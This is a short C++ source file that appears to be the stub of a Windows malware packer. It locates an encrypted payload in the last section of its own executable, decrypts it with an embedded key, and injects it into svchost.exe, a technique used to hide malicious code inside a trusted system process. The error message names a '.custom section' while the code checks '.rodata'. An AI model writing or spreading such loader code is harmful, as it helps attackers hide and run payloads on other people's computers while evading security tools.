/**
 * main.cpp
 */

#include <iostream>
#include <windows.h>
#include "loader.hpp"

char *get_packed_section(size_t *size) {
    char* unpacker = (char*) GetModuleHandleA(NULL);

    IMAGE_DOS_HEADER *dos_header = (IMAGE_DOS_HEADER *)unpacker;
    IMAGE_NT_HEADERS *nt_headers = (IMAGE_NT_HEADERS *)((LONG_PTR)unpacker +
            dos_header->e_lfanew);
    IMAGE_SECTION_HEADER *sections = (IMAGE_SECTION_HEADER *)(nt_headers + 1);

    size_t length = nt_headers->FileHeader.NumberOfSections;
    if (strcmp((char *)sections[length - 1].Name, ".rodata")) {
        return NULL;
    }

    *size = sections[length - 1].SizeOfRawData;
    return unpacker + sections[length - 1].VirtualAddress;
}

int main(int argc, char **argv)
{
    loader_t loader;
    char *packed = get_packed_section(&loader.size);
    if (!packed) {
        std::cerr << "error: unable to find .custom section" << std::endl;
        return 1;
    }

    loader.key = (char *)malloc(KEY_SIZE);
    memcpy(loader.key, packed, KEY_SIZE);

    loader.bytes = (char *)malloc(loader.size-KEY_SIZE);
    memcpy(loader.bytes, packed+KEY_SIZE+8, loader.size-KEY_SIZE-8);

    loader.size = loader.size - KEY_SIZE - 8;
    memcpy(&loader.orig_size, packed+KEY_SIZE, 8);

    loader_decrypt(&loader);
    if (!loader_inject(&loader, "c:/windows/system32/svchost.exe")) {
        return 1;
    }

    loader_free(&loader);
    return 0;
}